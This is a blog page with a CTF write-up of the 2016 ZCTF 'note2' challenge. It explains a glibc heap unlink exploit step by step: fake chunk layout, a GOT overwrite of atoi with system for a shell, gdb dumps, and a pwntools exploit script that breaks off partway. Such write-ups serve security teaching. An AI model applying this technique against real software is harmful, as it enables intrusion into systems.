@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>CTF | 2016 ZCTF note2 - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="2016 ZCTF note2 writeup 关于 unlink 利用
+unlink 来复习一下 unlink。。 控制堆块的 fd,bk 指针
+FD=P-&gt;fd BK=P-&gt;bkFD-&gt;bk = BKBK-&gt;fd = FD64位：
+fd = &amp;P-0x18bk = &amp;P-0x10效果： P = &amp;P-0X1832 位
+fd = &amp;p-12bk = &amp;p-8效果: p =&amp;p-12可以好好看一下 unlink 宏
+#define unlink(AV, P, BK, FD) { \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (&#34;corrupted size vs. prev_size&#34;); \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk !">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">CTF | 2016 ZCTF note2</h1>
+		<div class="post-meta">April 5, 2018</div>
+	</header>
+	<div class="post-content"><p>2016 ZCTF note2 writeup
+关于 unlink 利用</p>
+<!-- raw HTML omitted -->
+<h3 id="unlink">unlink</h3>
+<p>来复习一下 unlink。。
+控制堆块的 fd,bk 指针</p>
+<pre><code>FD=P-&gt;fd 
+BK=P-&gt;bk
+FD-&gt;bk = BK
+BK-&gt;fd = FD
+</code></pre><p>64位：</p>
+<pre><code>fd = &amp;P-0x18
+bk = &amp;P-0x10
+效果： P = &amp;P-0X18
+</code></pre><p>32 位</p>
+<pre><code>fd = &amp;p-12
+bk = &amp;p-8
+效果: p =&amp;p-12
+</code></pre><p>可以好好看一下 unlink 宏</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define unlink(AV, P, BK, FD) {                                            \
+</span><span style="color:#75715e">    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+</span><span style="color:#75715e">      malloc_printerr (&#34;corrupted size vs. prev_size&#34;);                              \
+</span><span style="color:#75715e">    FD = P-&gt;fd;                                                                      \
+</span><span style="color:#75715e">    BK = P-&gt;bk;                                                                      \
+</span><span style="color:#75715e">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \
+</span><span style="color:#75715e">      malloc_printerr (&#34;corrupted double-linked list&#34;);                              \
+</span><span style="color:#75715e">    else {                                                                      \
+</span><span style="color:#75715e">        FD-&gt;bk = BK;                                                              \
+</span><span style="color:#75715e">        BK-&gt;fd = FD;                                                              \
+</span><span style="color:#75715e">       ....
+</span><span style="color:#75715e"></span>}
+</code></pre></div><h3 id="分析程序">分析程序</h3>
+<p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
+<h4 id="add">add</h4>
+<p>size 限制为 <code>0x80</code></p>
+<h4 id="show">show</h4>
+<p>输出 <code>note</code> 内容</p>
+<h4 id="edit">edit</h4>
+<p>其中包括覆盖已有的 <code>note</code> ，在已有的 <code>note</code> 后面添加内容。</p>
+<h4 id="free">free</h4>
+<p>释放 chunk</p>
+<p>bss 段 ptr <code>0x00000602120</code> 管理 malloc chunk 的 ptr，是 ptr 的数组，我们的目的就是把 ptr 改为 ptr-12,然后可以修改 ptr[x] 的值什么的，然后往 <code>ptr[x]</code> 指向的地方写东西。 你想想 ptr[x] 改为 <code>free_hook</code> 或其他，再通过<code> edit x</code>，把内容改为 <code>system</code> 函数地址，不就利用啦</p>
+<h3 id="漏洞">漏洞</h3>
+<ol>
+<li>堆溢出<br>
+在添加 note 时，需要设置 <code>note</code> 的 <code>size</code> ，但是读取的循环变量 i 是<strong>无符号</strong>变量，所以比较时都会转换为无符号变量，那么当我们输入 <code>size</code> 为 0 时，<code>size-1</code> 会变成一个很大的整数，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
+ps:这个漏洞我自己是看不出的&hellip;</li>
+<li>free 漏洞<br>
+edit 函数,每次都会<code> malloc 0xa0</code>,但是 free 的时候没有把指针置为 NULL</li>
+</ol>
+<h3 id="利用">利用</h3>
+<h4 id="unlink-1">unlink</h4>
+<p>首先 <code>new</code> 三个 <code>chunk</code>: 大小分别为 <code>0x80,0,0x80。</code>
+第二个 <code>chunk</code> 虽然申请的大小为0，但是glibc的要求 chunk 块至少可以存储4个必要的字段<code>(prev_size,size,fd,bk)</code>，所以会分配 <code>0x20</code> 的空间,又因为程序漏洞，所以可以读取任意长度的内容。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x0000000000602120</span>
+<span style="color:#ae81ff">0x602120</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000861010</span>	<span style="color:#ae81ff">0x00000000008610a0</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">0</span>] ptr[<span style="color:#ae81ff">1</span>]
+<span style="color:#ae81ff">0x602130</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000008610c0</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">2</span>]
+<span style="color:#ae81ff">0x602140</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602150</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602160</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000003</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602170</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602180</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000006f6c6c6568</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+
+gef<span style="color:#960050;background-color:#1e0010">➤</span>  heap chunks
+Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x861010</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE) <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span>
+    [<span style="color:#ae81ff">0x0000000000861010</span>     <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     aaaaaaaaa.......] 
+Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x8610a0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x20</span>, flags<span style="color:#f92672">=</span>PREV_INUSE) <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span>
+    [<span style="color:#ae81ff">0x00000000008610a0</span>     <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     aaaaaaaa........]
+Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x8610c0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE) <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span>
+    [<span style="color:#ae81ff">0x00000000008610c0</span>     <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span>     bbbbbbbbbbbbbbbb]
+</code></pre></div><p>堆块结构：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x861010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0x861000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> header 
+<span style="color:#ae81ff">0x861010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x0000000000000061</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">0</span>] chunk <span style="color:#ae81ff">0</span> fake header1 
+<span style="color:#ae81ff">0x861020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000602108</span>	<span style="color:#ae81ff">0x0000000000602110</span> <span style="color:#f92672">=&gt;</span> fake fd, fake bk
+<span style="color:#ae81ff">0x861030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x861040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x861050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x861060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x861070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000060</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> fake pre_size <span style="color:#f92672">|</span> fake ptr[<span style="color:#ae81ff">0</span>] chunk<span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>s nextchunk
+<span style="color:#ae81ff">0x861080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x861090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000021</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> header
+<span style="color:#ae81ff">0x8610a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">1</span>]
+<span style="color:#ae81ff">0x8610b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> header
+<span style="color:#ae81ff">0x8610c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">2</span>] 
+<span style="color:#ae81ff">0x8610d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x8610e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x8610f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>其中构造了 <code>fake pre_size </code>是为了满足 <code>unlink</code> 中的检查</p>
+<p>接下来</p>
+<pre><code>释放chunk1-覆盖chunk2-释放chunk2
+deletenote(1)
+content = 'a' * 16 + p64(0xa0) + p64(0x90)
+newnote(0, content)
+deletenote(2)
+</code></pre><p><code>free chunk 1</code>,大小为 <code>0x20</code>,会放到 <code>fastbin</code>，<code>newnote</code> 的时候为同一个，通过栈溢出可以修改 <code>chunk 2</code> <code>的pre_size</code> 和 <code>size</code> 分别为 <code>0xa0</code> 和 <code>0x90</code>。主要是设置了 <code>pre_size</code> 为 <code>0xa0</code>,并且 <code>inuse</code> 为 0，在进行 <code>unlink</code> 时根据 <code>pre_size</code> 得到后一个 <code>chunk</code>,刚好是我们在 <code>chunk 0</code> 中构造的 <code>fake chunk</code>。所以释放 <code>chunk2</code> 的时候可以后向合并（合并低地址），对 <code>chunk 0</code> 中虚拟构造的 <code>chunk</code> 进行 <code>unlink</code> 。 <code>unlink</code> 成功后，<code>ptr[0]</code>所存储的地址变为 <code>fakebk</code> ，即<code> ptr-0x18</code>。
+可以看一下具体操作</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#75715e">/* consolidate backward */</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>prev_inuse(p)) {
+      prevsize <span style="color:#f92672">=</span> prev_size (p);
+      size <span style="color:#f92672">+=</span> prevsize;
+      p <span style="color:#f92672">=</span> chunk_at_offset(p, <span style="color:#f92672">-</span>((<span style="color:#66d9ef">long</span>) prevsize));
+      unlink(av, p, bck, fwd);
+    }
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0xae6010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0xae6000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
+<span style="color:#ae81ff">0xae6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x0000000000000061</span>
+<span style="color:#ae81ff">0xae6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000602108</span>	<span style="color:#ae81ff">0x0000000000602110</span>
+<span style="color:#ae81ff">0xae6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0xae6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0xae6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0xae6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0xae6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000060</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0xae6080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0xae6090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000021</span>
+<span style="color:#ae81ff">0xae60a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span> 
+<span style="color:#ae81ff">0xae60b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000000000a0</span>	<span style="color:#ae81ff">0x0000000000000090</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> header modified
+<span style="color:#ae81ff">0xae60c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626200</span>	<span style="color:#ae81ff">0x6262626262626262</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">2</span>]
+<span style="color:#ae81ff">0xae60d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0xae60e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0xae60f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>unlink后的效果：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x0000000000602120</span>
+<span style="color:#ae81ff">0x602120</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000602108</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span>
+<span style="color:#ae81ff">0x602130</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000008750a0</span>
+</code></pre></div><h4 id="泄露libc-地址">泄露libc 地址</h4>
+<p><code>edit note[0]</code>，即 <code>edit ptr[0]</code> 指向的地方,即 <code>ptr-0x18</code>,修改 <code>ptr[0]</code> 为 <code>atoi</code> 的 <code>got</code>,通过 <code>show</code> 得到 <code>atoi</code> 地址，计算得 <code>libc</code> 地址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x0000000000602120</span>
+<span style="color:#ae81ff">0x602120</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000602088</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> atoi<span style="color:#960050;background-color:#1e0010">@</span>got.plt
+<span style="color:#ae81ff">0x602130</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000023710a0</span>
+<span style="color:#ae81ff">0x602140</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602150</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602160</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000004</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602170</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602180</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000006f6c6c6568</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x602190</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x0000000000602088</span>
+<span style="color:#ae81ff">0x602088</span> <span style="color:#f92672">&lt;</span>atoi<span style="color:#960050;background-color:#1e0010">@</span>got.plt<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007fc6acaa3e80</span>	<span style="color:#ae81ff">0x00000000004008c6</span>
+<span style="color:#ae81ff">0x602098</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x6020a8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00007fc6acaa3e80</span>
+<span style="color:#ae81ff">0x7fc6acaa3e80</span> <span style="color:#f92672">&lt;</span>atoi<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00000aba08ec8348</span>	<span style="color:#ae81ff">0x00004530e8f63100</span>
+</code></pre></div><p>接下来修改 <code>atoi</code> 的 <code>got</code> 为 <code>system</code> 函数的地址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">content <span style="color:#f92672">=</span> p64(system_addr)
+editnote(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, content)
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>gx <span style="color:#ae81ff">0x0000000000602088</span>
+<span style="color:#ae81ff">0x602088</span> <span style="color:#f92672">&lt;</span>atoi<span style="color:#960050;background-color:#1e0010">@</span>got.plt<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007f44aa9a1390</span>	<span style="color:#ae81ff">0x00000000004008c6</span>
+<span style="color:#ae81ff">0x602098</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x6020a8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x6020b8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00007f44aad21620</span>
+gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>gx <span style="color:#ae81ff">0x00007f44aa9a1390</span>
+<span style="color:#ae81ff">0x7f44aa9a1390</span> <span style="color:#f92672">&lt;</span>__libc_system<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0xfa86e90b74ff8548</span>	<span style="color:#ae81ff">0x0000441f0f66ffff</span>
+<span style="color:#ae81ff">0x7f44aa9a13a0</span> <span style="color:#f92672">&lt;</span>__libc_system<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x48001479b83d8d48</span>	<span style="color:#ae81ff">0xfffffa70e808ec83</span>
+
+</code></pre></div><h4 id="getshell">getshell</h4>
+<p>发送 <code>'/bin/sh' </code>就可以成功 <code>getshell</code> 了<br>
+最终 <code>payload</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./note2&#39;</span>)
+note2 <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./note2&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">newnote</span>(length, content):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;option---&gt;&gt;&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;(less than 128)&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(length))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;content:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(content)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shownote</span>(id):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;option---&gt;&gt;&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;note:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(id))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">editnote</span>(id, choice, s):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;option---&gt;&gt;&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;note:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(id))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;2.append]&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(choice))
+    p<span style="color:#f92672">.</span>sendline(s)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">deletenote</span>(id):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;option---&gt;&gt;&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;4&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;note:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(id))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlink</span>():
+	ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000602120</span>
